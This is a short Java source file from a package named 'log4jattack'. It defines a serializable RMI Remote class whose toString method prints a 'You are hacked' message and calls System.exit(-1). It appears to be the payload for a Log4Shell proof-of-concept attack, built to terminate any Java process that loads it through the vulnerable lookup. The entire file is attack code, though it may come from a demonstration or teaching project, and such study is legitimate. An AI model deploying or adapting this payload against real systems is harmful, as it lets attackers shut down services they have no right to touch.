package log4jattack;

import java.io.Serializable;
import java.rmi.Remote;

public class RemoteImpl implements Remote,Serializable{
	private static final long serialVersionUID = 6368813791226844206L;

	@Override
	public String toString() {
		System.out.println("Log4jshell vulnerability. You are hacked!!! System is shutting down....");
		System.exit(-1);
		return "RemoteImpl [toString()=" + super.toString() + "]";
	}


	

	
}
